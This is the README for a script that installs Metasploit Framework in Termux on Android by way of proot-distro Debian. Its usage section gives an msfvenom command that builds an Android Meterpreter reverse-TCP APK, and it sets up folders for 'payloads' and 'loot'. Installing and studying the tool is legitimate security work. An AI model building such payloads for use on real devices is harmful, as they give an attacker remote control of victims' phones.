
# Metasploit-Framework Installer for Termux



<p align="center">
  <img src="https://user-images.githubusercontent.com/46929618/154997514-8bd1d6c6-6b3d-4251-a6ce-6b8bceb22b06.png" width="100%" alt="Banner">
</p>
<p align="center">
<img title="Version" src="https://img.shields.io/badge/Version-3.0.0-green.svg?style=flat-square">
<img title="Maintainence" src="https://img.shields.io/badge/Maintained%3F-yes-green.svg?style=flat-square">
<img title="Proot" src="https://img.shields.io/badge/Method-Proot--Distro-blue.svg?style=flat-square">
<img title="License" src="https://img.shields.io/badge/License-GNU-blue.svg?style=flat-square">
</p>
<p align="center">
<a href="https://github.com/h4ck3r0"><img title="Github" src="https://img.shields.io/badge/H4CK3R-RAJ-brightgreen?style=for-the-badge&logo=github"></a>
<a href="https://youtube.com/c/H4Ck3R0"><img title="YouTube" src="https://img.shields.io/badge/YouTube-H4CK3R-red?style=for-the-badge&logo=Youtube"></a>
</p>

---

### 🛡️ ABOUT THE TOOL
Since Metasploit was removed from the official Termux repositories, installing it has become difficult due to **Ruby gem compilation errors** (Nokogiri/Gumbo). This script now supports three installation methods, including the **recommended proot-distro approach** which completely bypasses all gem errors.

---

### ✅ INSTALLATION METHODS

| Method | Android | Stability | Size | Recommended |
|--------|---------|-----------|------|-------------|
| **Proot-Distro (Debian)** | 7.0+ | ⭐⭐⭐⭐⭐ | ~300MB | ✅ YES |
| Direct Install (Modern) | 7.0+ | ⭐⭐⭐ | ~150MB | ⚠️ May have gem errors |
| Legacy Install | 4.4-6.0 | ⭐⭐ | ~150MB | ❌ Old MSF version |

---

### 🚀 FEATURES (Proot Method)
* **[+]** Zero Ruby gem compilation — uses Rapid7 official pre-built package.
* **[+]** Lightweight Debian (~300MB) — not heavy Kali Linux.
* **[+]** `/sdcard` auto-mounted — save payloads directly to phone storage.
* **[+]** PostgreSQL auto-configured inside Debian.
* **[+]** Three launchers: `msfconsole`, `msfvenom`, `msf-shell`.
* **[+]** Update MSF anytime with `apt upgrade` inside Debian.

---

### 🛠️ REQUIREMENTS
* Termux (Latest version from F-Droid)
* Minimum 2GB Internal Storage
* Stable Internet Connection
* Android 7.0+ (for proot method)

---

### 📥 INSTALLATION

```bash
# Update and upgrade system
apt update && apt upgrade -y

# Install git
apt install git -y

# Clone the repository
git clone https://github.com/h4ck3r0/Metasploit-termux

# Enter directory
cd Metasploit-termux

# Grant execution permission
chmod +x *

# Run the installer
bash metasploit.sh
```

> **Choose Option 3 → Proot-Distro (Recommended)**

---

### 🎮 USAGE

```bash
# Launch Metasploit console
msfconsole

# Generate payloads (saves to /sdcard/MSF/payloads/ by default)
msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 \
  -o /sdcard/MSF/payloads/payload.apk

# Enter Debian shell (to build tools, copy files, etc.)
msf-shell
```

---

### 📁 FILE ACCESS & STORAGE

Files built inside the Debian proot can be copied to your phone storage easily:

```bash
# From inside Debian (msf-shell), /sdcard is mounted:
cp /root/mytool.apk /sdcard/MSF/mytool.apk

# Access from Android: Internal Storage → MSF → payloads/
```

**Auto-mounted paths inside Debian:**
| Debian Path | Points To |
|-------------|-----------|
| `/sdcard/` | Phone internal storage |
| `/sdcard/MSF/payloads/` | Payload output folder |
| `/sdcard/MSF/loot/` | Loot/data folder |
| `/root/msf-output/` | Alias for `/sdcard/MSF/` |

---

### 📢 IMPORTANT NOTICE

Metasploit is resource-intensive. If the process is killed by Android:
- Disable **Battery Optimization** for Termux in Android settings
- Enable **Phantom Process Killer** workaround for Android 12+:
  ```bash
  adb shell device_config set_sync_disabled_for_tests persistent
  adb shell device_config put activity_manager max_phantom_processes 2147483647
  ```

---

### 🌐 CONNECT WITH US

<p align="left">
  <a href="https://www.h4ck3r.me">
    <img src="https://img.shields.io/badge/Website-h4ck3r.me-yellow?style=for-the-badge&logo=blogger" alt="Website">
  </a>
  <a href="https://t.me/h4ck3r_group">
    <img src="https://img.shields.io/badge/Telegram-Channel-blue?style=for-the-badge&logo=telegram" alt="Telegram">
  </a>
  <a href="https://www.instagram.com/h4ck3r0_official">
    <img src="https://img.shields.io/badge/Instagram-Follow-red?style=for-the-badge&logo=instagram" alt="Instagram">
  </a>
</p>

<a href="https://www.buymeacoffee.com/h4ck3r" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 50px !important;width: 180px !important;" ></a>

---

**Developed by Raj Aryan (h4ck3r0)** *Give a ⭐ if this script helped you!*
